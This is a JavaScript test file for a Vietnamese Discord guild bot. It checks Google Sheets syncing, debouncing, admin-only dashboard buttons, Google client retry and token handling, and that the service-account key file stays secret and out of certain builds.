    await sheetSync.syncNow(clientOf(people()), GUILD);
    const rows = fake.sheets.get('ThanhVien').rows;
    const binh = rows.findIndex((r) => r[7] === sid(2));
    rows[binh][10] = 'Công (admin xếp)';
    rows[binh][12] = 'hay vắng';
    const res = await sheetSync.syncNow(clientOf(people()), GUILD);
    assert.equal(res.kept, 1);
    const again = fake.sheets.get('ThanhVien').rows.find((r) => r[7] === sid(2));
    assert.deepEqual([again[10], again[12]], ['Công (admin xếp)', 'hay vắng']);
  });

  it('SuKien only when the events feature is on and the guild has had events', async () => {
    eventData = { items: [{ event: { _id: oid(3), title: 'Tiệc bang', status: 'open', startAt: vn(2026, 10, 17, 20) }, replies: [{ discordId: sid(1), status: 'yes' }] }], any: true };
    let fake = createFakeSheets();
    gateway.setClient(fake);
    const res = await sheetSync.syncNow(clientOf(people()), GUILD);
    assert.equal(res.events, 1);
    assert.deepEqual(fake.sheets.get('SuKien').rows[1].slice(0, 7), ['Tiệc bang', '17/10/2026', 'Đang mở', '', 'An', '', '✅ Tham gia']);
    config = { ...config, features: { events: false } };
    fake = createFakeSheets();
    gateway.setClient(fake);
    const off = await sheetSync.syncNow(clientOf(people()), GUILD);
    assert.ok(!('events' in off));
    assert.ok(!fake.sheets.has('SuKien'));
  });

  it('no sheet id -> skipped with a hint, nothing called; no key -> skipped with the key hint; never throws', async () => {
    const fake = createFakeSheets();
    gateway.setClient(fake);
    config = { ...config, sheetId: null };
    let res = await sheetSync.syncNow(clientOf(people()), GUILD);
    assert.equal(res.ok, false);
    assert.equal(res.skipped, 'no-sheet');
    assert.match(res.message, /Google Sheet/);
    assert.equal(fake.calls.length, 0);
    gateway.setClient(null);
    process.env.GOOGLE_KEY_FILE = path.join(dir, 'missing.json');
    config = { ...config, sheetId: SHEET_ID };
    res = await sheetSync.syncNow(clientOf(people()), GUILD);
    assert.equal(res.skipped, 'no-key');
    assert.match(res.message, /google-key\.json/);
  });

  it('a failing Google call is logged and returned as a sentence, never thrown (403 names the account)', async () => {
    gateway.setClient(createFakeSheets({ fail: { status: 403, message: 'no access' } }));
    const res = await sheetSync.syncNow(clientOf(people()), GUILD);
    assert.equal(res.ok, false);
    assert.match(res.message, /Editor\*\* cho `bot@proj\.iam\.gserviceaccount\.com`/);
    assert.ok(console.error.mock.calls.length >= 1);
  });

  it('syncs queued while one runs collapse into ONE extra run that reads fresh data', async () => {
    const fake = createFakeSheets();
    gateway.setClient(fake);
    let release;
    const gate = new Promise((r) => (release = r));
    const orig = fake.getSpreadsheet;
    let runs = 0;
    fake.getSpreadsheet = async (...a) => {
      runs += 1;
      if (runs === 1) await gate;
      return orig(...a);
    };
    const client = clientOf(people());
    const first = sheetSync.syncNow(client, GUILD);
    const second = sheetSync.syncNow(client, GUILD);
    const third = sheetSync.syncNow(client, GUILD);
    release();
    await Promise.all([first, second, third]);
    assert.equal(syncs(fake), 2);
  });

  it('getStatus: last success time kept, last error recorded and cleared by the next success; skips are not recorded', async () => {
    const client = clientOf(people());
    assert.equal(sheetSync.getStatus(GUILD), null);
    gateway.setClient(createFakeSheets());
    await sheetSync.syncNow(client, GUILD);
    const ok = sheetSync.getStatus(GUILD);
    assert.ok(ok.at instanceof Date);
    assert.equal(ok.error, null);
    assert.equal(ok.members, 2);
    gateway.setClient(createFakeSheets({ fail: { status: 403 } }));
    await sheetSync.syncNow(client, GUILD);
    const bad = sheetSync.getStatus(GUILD);
    assert.match(bad.error, /Chưa chia sẻ quyền/);
    assert.equal(bad.at, ok.at, 'the last success time stays');
    gateway.setClient(createFakeSheets());
    await sheetSync.syncNow(client, GUILD);
    assert.equal(sheetSync.getStatus(GUILD).error, null);
    sheetSync.cancelScheduled();
    config = { ...config, sheetId: null };
    await sheetSync.syncNow(client, GUILD);
    assert.equal(sheetSync.getStatus(GUILD), null, 'a skipped sync (no sheet) leaves no status');
  });
});

describe('sheetSync.scheduleSync (debounce)', () => {
  const client = { guilds: { cache: new Map([[GUILD, makeGuild()]]) } };

  it('a burst of registrations makes ONE sync after the delay (20 s by default)', async () => {
    mock.timers.enable({ apis: ['setTimeout'] });
    try {
      const fake = createFakeSheets();
      gateway.setClient(fake);
      for (let i = 0; i < 25; i++) sheetSync.scheduleSync(client, GUILD);
      mock.timers.tick(sheetSync.SYNC_DEBOUNCE_MS - 1);
      assert.equal(fake.calls.length, 0);
      mock.timers.tick(1);
      await new Promise((r) => setImmediate(r));
      await new Promise((r) => setImmediate(r));
      assert.equal(syncs(fake), 1);
      sheetSync.scheduleSync(client, GUILD); // a new burst after the first one fired starts a new timer
      mock.timers.tick(sheetSync.SYNC_DEBOUNCE_MS);
      await new Promise((r) => setImmediate(r));
      await new Promise((r) => setImmediate(r));
      assert.equal(syncs(fake), 2);
    } finally {
      mock.timers.reset();
    }
  });
  it('without a key file no timer is created at all', () => {
    mock.timers.enable({ apis: ['setTimeout'] });
    try {
      process.env.GOOGLE_KEY_FILE = path.join(dir, 'missing.json');
      sheetSync.scheduleSync(client, GUILD);
      assert.equal(mock.timers.tick(60000), undefined);
      assert.equal(updates.length, 0);
    } finally {
      mock.timers.reset();
    }
  });
  it('the default delay is 20 s', () => {
    assert.equal(sheetSync.SYNC_DEBOUNCE_MS, 20000);
  });
  it('a call with a SHORTER delay re-arms the waiting timer (a new war syncs now, not in 20 s); a longer one does not push it back', async () => {
    mock.timers.enable({ apis: ['setTimeout'] });
    try {
      const fake = createFakeSheets();
      gateway.setClient(fake);
      sheetSync.scheduleSync(client, GUILD); // 20 s
      sheetSync.scheduleSync(client, GUILD, 0); // war created: now
      mock.timers.tick(0);
      await new Promise((r) => setImmediate(r));
      await new Promise((r) => setImmediate(r));
      assert.equal(syncs(fake), 1);
      sheetSync.scheduleSync(client, GUILD, 1000);
      sheetSync.scheduleSync(client, GUILD, 20000);
      mock.timers.tick(1000);
      await new Promise((r) => setImmediate(r));
      await new Promise((r) => setImmediate(r));
      assert.equal(syncs(fake), 2);
    } finally {
      mock.timers.reset();
    }
  });
});

// ---------- the dashboard buttons ----------

describe('adm:sheet / adm:sheetModal / adm:sheetsync', () => {
  const fakeInteraction = (extra = {}) => {
    const log = [];
    const i = {
      guildId: GUILD,
      user: { id: sid(900), username: 'a' },
      member: { roles: [], permissions: MANAGE },
      memberPermissions: MANAGE,
      client: { guilds: { cache: new Map([[GUILD, makeGuild()]]) } },
      deferReply: async () => log.push(['deferReply']),
      editReply: async (o) => log.push(['editReply', o]),
      reply: async (o) => log.push(['reply', o]),
      showModal: async (m) => log.push(['showModal', m]),
      ...extra,
    };
    return { i, log };
  };
  const submit = async (value, extra = {}) => {
    const { i, log } = fakeInteraction({ fields: { getTextInputValue: () => value }, ...extra });
    await adminHandler.handle(i, ['adm', 'sheetModal']);
    return log.filter((l) => l[0] === 'editReply').pop()[1];
  };

  it('✏️ Đổi Sheet opens a modal prefilled with the saved id; non-admins get a refusal instead', async () => {
    const { i, log } = fakeInteraction();
    await adminHandler.handle(i, ['adm', 'sheetedit']);
    assert.equal(log[0][0], 'showModal');
    const json = log[0][1].toJSON();
    assert.equal(json.custom_id, 'adm:sheetModal');
    assert.ok(JSON.stringify(json).includes(SHEET_ID));
    const nope = fakeInteraction({ member: { roles: [], permissions: NOBODY }, memberPermissions: NOBODY });
    await adminHandler.handle(nope.i, ['adm', 'sheetedit']);
    assert.match(nope.log[0][1].content, /không có quyền/);
  });

  it('valid link + access: saves the id (from a full URL), reports the spreadsheet title, schedules a sync', async () => {
    gateway.setClient(createFakeSheets({ title: 'Bang hội Long Linh' }));
    config = { ...config, sheetId: null };
    const reply = await submit(`https://docs.google.com/spreadsheets/d/${SHEET_ID}/edit#gid=0`);
    assert.deepEqual(updates, [{ sheetId: SHEET_ID }]);
    assert.match(reply, /✅ Đã nối Google Sheet \*\*Bang hội Long Linh\*\*/);
    assert.match(reply, /ThanhVien[^]*BangChien_TuanNay[^]*BangChien_LichSu/);
  });

  it('403 / 404 on the title read: NOT saved, and the reply shows the service-account e-mail', async () => {
    for (const status of [403, 404]) {
      updates.length = 0;
      gateway.setClient(createFakeSheets({ fail: { status, on: 'getSpreadsheet' } }));
      const reply = await submit(SHEET_ID);
      assert.match(reply, /chưa lưu/i);
      assert.match(reply, /Editor\*\* cho `bot@proj\.iam\.gserviceaccount\.com`/);
      assert.deepEqual(updates, []);
    }
  });

  it('Viewer-only share: the title read passes but the write probe is refused -> NOT saved, clear message with the account e-mail', async () => {
    const fake = createFakeSheets({ title: 'Chỉ xem', fail: { status: 403, on: 'batchUpdate' } });
    gateway.setClient(fake);
    const reply = await submit(SHEET_ID);
    assert.match(reply, /chưa lưu/i);
    assert.match(reply, /chỉ có quyền \*\*xem\*\*/);
    assert.match(reply, /`bot@proj\.iam\.gserviceaccount\.com`/);
    assert.deepEqual(updates, []);
    const probe = fake.calls.find((c) => c[0] === 'batchUpdate')[2];
    assert.deepEqual(probe, [{ updateSpreadsheetProperties: { properties: { title: 'Chỉ xem' }, fields: 'title' } }], 'a no-op write: the title set to itself');
  });

  it('a link that is not a spreadsheet is refused; an empty value turns the sync off', async () => {
    gateway.setClient(createFakeSheets());
    assert.match(await submit('https://example.com/nope'), /không hợp lệ/);
    assert.deepEqual(updates, []);
    assert.match(await submit('   '), /Đã tắt đồng bộ/);
    assert.deepEqual(updates, [{ sheetId: null }]);
  });

  it('without the key file: a clear hint (no crash, nothing saved)', async () => {
    process.env.GOOGLE_KEY_FILE = path.join(dir, 'missing.json');
    const reply = await submit(SHEET_ID);
    assert.match(reply, /google-key\.json/);
    assert.deepEqual(updates, []);
  });

  const lastEdit = (log) => log.filter((l) => l[0] === 'editReply').pop()[1];
  const buttonsOf = (reply) => (reply.components || []).flatMap((r) => r.toJSON().components);
  const inPlace = (extra = {}) => fakeInteraction({ deferUpdate: async () => {}, ...extra });

  it('📊 Google Sheet view, sheet connected and healthy: title, link button, never-synced note, sync-now + change buttons', async () => {
    gateway.setClient(createFakeSheets({ title: 'Bang hội Long Linh' }));
    const { i, log } = fakeInteraction();
    await adminHandler.handle(i, ['adm', 'sheet']);
    assert.equal(log[0][0], 'deferReply');
    const reply = lastEdit(log);
    assert.match(reply.content, /\*\*Bang hội Long Linh\*\*/);
    assert.match(reply.content, /Chưa đồng bộ từ lúc bot khởi động/);
    const buttons = buttonsOf(reply);
    assert.deepEqual(buttons.map((b) => b.label), ['Mở Sheet', '🔄 Đồng bộ ngay', '✏️ Đổi Sheet']);
    assert.equal(buttons[0].url, gateway.sheetUrl(SHEET_ID));
    assert.deepEqual(buttons.slice(1).map((b) => b.custom_id), ['adm:sheetnow', 'adm:sheetedit']);
  });

  it('📊 view shows the last sync time, and the last error when the last attempt failed', async () => {
    gateway.setClient(createFakeSheets());
    await sheetSync.syncNow({ guilds: { cache: new Map([[GUILD, makeGuild()]]) } }, GUILD);
    const ok = fakeInteraction();
    await adminHandler.handle(ok.i, ['adm', 'sheet']);
    assert.match(lastEdit(ok.log).content, /Đồng bộ lần cuối: <t:\d+:R>/);
    gateway.setClient(createFakeSheets({ fail: { status: 403, on: 'valuesBatchUpdate' } }));
    await sheetSync.syncNow({ guilds: { cache: new Map([[GUILD, makeGuild()]]) } }, GUILD);
    gateway.setClient(createFakeSheets({ fail: { status: 404, on: 'getSpreadsheet' } }));
    const bad = fakeInteraction();
    await adminHandler.handle(bad.i, ['adm', 'sheet']);
    const reply = lastEdit(bad.log);
    assert.match(reply.content, /Lỗi lần gần nhất: Chưa chia sẻ quyền/);
    assert.match(reply.content, /Không đọc được Sheet/);
    assert.equal(buttonsOf(reply)[0].label, 'Mở Sheet', 'the link is still offered');
  });

  it('📊 view without a sheet: the setup hint (service-account e-mail) and "✏️ Đặt Sheet"; without the key: the key hint', async () => {
    gateway.setClient(createFakeSheets());
    config = { ...config, sheetId: null };
    const none = fakeInteraction();
    await adminHandler.handle(none.i, ['adm', 'sheet']);
    const reply = lastEdit(none.log);
    assert.match(reply.content, /Chưa nối Google Sheet/);
    assert.match(reply.content, /`bot@proj\.iam\.gserviceaccount\.com`[^]*Editor/);
    assert.deepEqual(buttonsOf(reply).map((b) => [b.label, b.custom_id]), [['✏️ Đặt Sheet', 'adm:sheetedit']]);
    gateway.setClient(null);
    process.env.GOOGLE_KEY_FILE = path.join(dir, 'missing.json');
    const nokey = fakeInteraction();
    await adminHandler.handle(nokey.i, ['adm', 'sheet']);
    assert.match(lastEdit(nokey.log).content, /google-key\.json/);
    assert.equal(buttonsOf(lastEdit(nokey.log))[0].disabled, true);
  });

  it('🔄 Đồng bộ ngay: syncs, reports the counts, redraws the current war message and the dashboard, view redrawn in place', async () => {
    const fake = createFakeSheets();
    gateway.setClient(fake);
    const { i, log } = inPlace();
    await adminHandler.handle(i, ['adm', 'sheetnow']);
    const reply = lastEdit(log);
    assert.match(reply.content, /✅ Đã đồng bộ: 0 thành viên, 0 dòng bang chiến tuần này, 0 dòng lịch sử/);
    assert.match(reply.content, /Đã vẽ lại bài bang chiến và bảng điều khiển/);
    assert.match(reply.content, /Đồng bộ lần cuối: <t:\d+:R>/);
    assert.ok(fake.sheets.has(feed.MEMBER_TAB));
    assert.deepEqual(redraws.map((r) => r[0]), ['war', 'panel']);
    assert.equal(String(redraws[0][1]), String(EID));
    assert.deepEqual(redraws[0][2], { panel: false });
    assert.equal(redraws[1][1], GUILD);

    redraws.length = 0;
    gateway.setClient(createFakeSheets({ fail: { status: 403 } }));
    const bad = inPlace();
    await adminHandler.handle(bad.i, ['adm', 'sheetnow']);
    assert.match(lastEdit(bad.log).content, /⚠️ Chưa đồng bộ được: Chưa chia sẻ quyền/);
    assert.deepEqual(redraws.map((r) => r[0]), ['war', 'panel'], 'the redraw happens after a failed sync too');
  });

  it('🔄 Đồng bộ ngay without a sheet does nothing but show the hint', async () => {
    config = { ...config, sheetId: null };
    const { i, log } = inPlace();
    await adminHandler.handle(i, ['adm', 'sheetnow']);
    assert.match(lastEdit(log).content, /Chưa cài Google Sheet/);
    assert.deepEqual(redraws, []);
  });

  it('adm:sheet / adm:sheetnow / adm:sheetedit are admin-only', async () => {
    for (const action of ['sheet', 'sheetnow', 'sheetedit']) {
      redraws.length = 0;
      const fake = createFakeSheets();
      gateway.setClient(fake);
      const nope = inPlace({ member: { roles: [], permissions: NOBODY }, memberPermissions: NOBODY });
      await adminHandler.handle(nope.i, ['adm', action]);
      const last = nope.log[nope.log.length - 1];
      assert.match(last[1].content || last[1], /không có quyền/, action);
      assert.deepEqual(fake.calls, [], `${action}: Google never called`);
      assert.deepEqual(redraws, []);
    }
  });

  it('buildSheetView limits: long titles / errors are cut, content stays under the 2000-character message limit', () => {
    const view = buildSheetView({ configured: true, hasKey: true, title: 'T'.repeat(500), url: gateway.sheetUrl(SHEET_ID), status: { at: new Date(), error: 'E'.repeat(3000) }, note: 'N'.repeat(300) });
    assert.ok(view.content.length < 2000);
  });
});

// ---------- repository hygiene ----------

describe('google-key.json is a secret', () => {
  const root = path.join(__dirname, '..');
  it('is git-ignored and shipped (optionally, ACL-locked like the .env) by the installer', () => {
    assert.match(fs.readFileSync(path.join(root, '.gitignore'), 'utf8'), /^google-key\.json$/m);
    const iss = fs.readFileSync(path.join(root, 'packaging', 'longlinh.iss'), 'utf8');
    assert.match(iss, /google-key\.json[^\n]*skipifsourcedoesntexist/);
    assert.match(iss, /ACL google-key\.json/);
    assert.match(fs.readFileSync(path.join(root, 'packaging', 'build.js'), 'utf8'), /google-key\.json/);
  });
});

// ---------- review fixes ----------

describe('googleClient hardening', () => {
  const res = (status, body, headers = {}) => ({ ok: status >= 200 && status < 300, status, headers: { get: (h) => headers[h.toLowerCase()] ?? null }, json: async () => body });
  const isToken = (url) => String(url).startsWith('https://oauth2.example');

  it('the token request is retried on 5xx / network errors, the JWT is back-dated 30 s', async () => {
    let n = 0;
    const sent = [];
    const fn = async (url, init) => {
      if (isToken(url)) {
        sent.push(init.body);
        n += 1;
        if (n === 1) throw new Error('ECONNRESET');
        if (n === 2) return res(503, {});
        return res(200, { access_token: 't', expires_in: 3600 });
      }
      return res(200, { values: [] });
    };
    const now = () => 1_800_000_000_000;
    const client = createGoogleClient({ keyFile, fetchImpl: fn, sleep: async () => {}, now });
    await client.valuesGet('S', "'A'!A1");
    assert.equal(n, 3);
    const claims = JSON.parse(Buffer.from(new URLSearchParams(sent[2]).get('assertion').split('.')[1], 'base64url'));
    assert.equal(claims.iat, 1_800_000_000 - 30);
    assert.equal(claims.exp, claims.iat + 3600);
  });

  it('parallel calls share ONE token request', async () => {
    let tokens = 0;
    const fn = async (url) => {
      if (isToken(url)) {
        tokens += 1;
        await new Promise((r) => setTimeout(r, 5));
        return res(200, { access_token: 't', expires_in: 3600 });
      }
      return res(200, { values: [] });
    };
    const client = createGoogleClient({ keyFile, fetchImpl: fn, sleep: async () => {} });
    await Promise.all([client.valuesGet('S', "'A'!A1"), client.valuesGet('S', "'B'!A1"), client.getSpreadsheet('S')]);
    assert.equal(tokens, 1);
  });

  it('a 401 on an API call signs in again ONCE and retries; a second 401 is an error', async () => {
    let tokens = 0;
    let api = 0;
    const fn = async (url, init) => {
      if (isToken(url)) {
        tokens += 1;
        return res(200, { access_token: `t${tokens}`, expires_in: 3600 });
      }
      api += 1;
      return init.headers.Authorization === 'Bearer t2' ? res(200, { values: [['ok']] }) : res(401, { error: { message: 'expired' } });
    };
    const client = createGoogleClient({ keyFile, fetchImpl: fn, sleep: async () => {} });
    assert.deepEqual(await client.valuesGet('S', "'A'!A1"), [['ok']]);
    assert.deepEqual([tokens, api], [2, 2]);
    // the re-sign after a 401 does not eat one of the 3 retries of a flaky 503
    let apiCalls = 0;
    let signIns = 0;
    const flaky = async (url, init) => {
      if (isToken(url)) return res(200, { access_token: `t${++signIns}`, expires_in: 3600 });
      apiCalls += 1;
      if (apiCalls === 1) return res(401, {});
      if (apiCalls <= 4) return res(503, {});
      return res(200, { values: [['fine']] });
    };
    const c3 = createGoogleClient({ keyFile, fetchImpl: flaky, sleep: async () => {} });
    assert.deepEqual(await c3.valuesGet('S', "'A'!A1"), [['fine']]);
    const always = createGoogleClient({ keyFile, fetchImpl: async (url) => (isToken(url) ? res(200, { access_token: 'x', expires_in: 3600 }) : res(401, { error: { message: 'no' } })), sleep: async () => {} });
    await assert.rejects(() => always.valuesGet('S', "'A'!A1"), (e) => e.status === 401);
  });
});

describe('client.js member add/remove trigger', () => {
  it('schedules a sync only for a guild whose (cached) config has a sheet', async () => {
    const listeners = new Map();
    const { Client } = require('discord.js');
    process.env.GOOGLE_KEY_FILE = keyFile;
    gateway.resetAvailability();
    mock.method(Client.prototype, 'login', async () => 'ok');
    mock.method(Client.prototype, 'on', function (ev, fn) { listeners.set(ev, [...(listeners.get(ev) || []), fn]); return this; });
    mock.method(Client.prototype, 'once', function () { return this; });
    await require('../src/bot/client').startBot('t');
    const fns = listeners.get('guildMemberAdd');
    sheetSync.cancelScheduled();
    mock.timers.enable({ apis: ['setTimeout'] });
    try {
      const fake = createFakeSheets();
      gateway.setClient(fake);
      await fns[0]({ guild: { id: 'other-guild' } });
      await new Promise((r) => setImmediate(r));
      mock.timers.tick(21000);
      await new Promise((r) => setImmediate(r));
      assert.equal(fake.calls.length, 0, 'no sheet -> no sync');
      await fns[0]({ guild: { id: GUILD } });
      await new Promise((r) => setImmediate(r));
      mock.timers.tick(21000);
      await new Promise((r) => setImmediate(r));
      await new Promise((r) => setImmediate(r));
      assert.ok(sheetSync.getStatus(GUILD), 'a guild with a sheet syncs (here it stops at the uncached member list)');
    } finally {
      mock.timers.reset();
    }
  });
});

describe('review fixes: tabs, availability, lineup link', () => {
  it('isAvailable caches the key-file check for ~60 s per file (a registration click does not hit the disk)', () => {
    process.env.GOOGLE_KEY_FILE = keyFile;
    gateway.resetAvailability();
    assert.equal(gateway.isAvailable(), true);
    fs.rmSync(keyFile);
    assert.equal(gateway.isAvailable(), true, 'cached');
    gateway.resetAvailability();
    assert.equal(gateway.isAvailable(), false);
  });

  it('parseLineupUrl measures the NORMALIZED href; the modal prefill and the war-message button respect the Discord limits', () => {
    const { parseLineupUrl, MAX_URL } = require('../src/bot/ui/lineupLink');
    const { buildPublishModal } = require('../src/bot/ui/settingsModal');
    const { buildWarMessage } = require('../src/bot/ui/warMessage');
    const long = `https://x.example/${'đ'.repeat(200)}`;
    assert.ok(long.length < MAX_URL && new URL(long).href.length > MAX_URL);
    assert.equal(parseLineupUrl(long), null);
    assert.equal(parseLineupUrl(' https://x.example/a b '), 'https://x.example/a%20b');
    assert.equal(parseLineupUrl('ftp://x.example/a'), null);
    // an over-long stored link (from before this check) is not pre-filled and gets no button
    const stored = { _id: EID, guildId: GUILD, title: 'W', status: 'published', startAt: vn(2026, 10, 10, 20), deadlineAt: vn(2026, 10, 10, 18), lineupUrl: `https://x.example/${'a'.repeat(600)}` };
    assert.ok(!JSON.stringify(buildPublishModal(stored).toJSON()).includes('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'));
    const v2 = JSON.stringify(buildWarMessage(stored, [], guildConfigService.defaultConfig(GUILD)).components.map((c) => c.toJSON()));
    assert.ok(!v2.includes('"style":5'), 'no link button');
  });

  it('build.js: GOOGLE_KEY_FILE of the env file is honoured; --with-google-key fails clearly when the key is missing', () => {
    const { googleKeyPath, main } = require('../packaging/build');
    assert.equal(googleKeyPath('PORT=1\n', 'C:\\env'), path.join('C:\\env', 'google-key.json'));
    assert.equal(googleKeyPath('GOOGLE_KEY_FILE=keys/g.json # note\n', dir), path.resolve(dir, 'keys/g.json'));
    assert.equal(googleKeyPath('GOOGLE_KEY_FILE="' + keyFile + '"\n', dir), keyFile);
    const envFile = path.join(dir, '.env');
    fs.writeFileSync(envFile, 'PORT=3000\nGOOGLE_KEY_FILE=nope.json\n');
    assert.throws(() => main(['--with-google-key', '--env', envFile, '--out', path.join(dir, 'out')]), /key file not found/);
  });

  it('build.js: the Google key is never staged for --wsb builds', () => {
    const { parseArgs, main } = require('../packaging/build');
    assert.equal(parseArgs([]).googleKey, null);
    assert.equal(parseArgs(['--with-google-key']).googleKey, true);
    assert.equal(parseArgs(['--no-google-key']).googleKey, false);
    assert.throws(() => main(['--wsb', '--with-google-key']), /--wsb refused with --with-google-key/);
    const src = fs.readFileSync(path.join(__dirname, '..', 'packaging', 'build.js'), 'utf8');
    assert.match(src, /googleKey === null \? !wsb : googleKey/);
  });

  it('the no-key hint says the key is a secret that must be locked', () => {
    assert.match(gateway.NO_KEY_HINT(), /bí mật/);
    assert.match(fs.readFileSync(path.join(__dirname, '..', 'packaging', 'HUONG-DAN.txt'), 'utf8'), /google-key\.json[^]*khoá quyền/);
  });
});
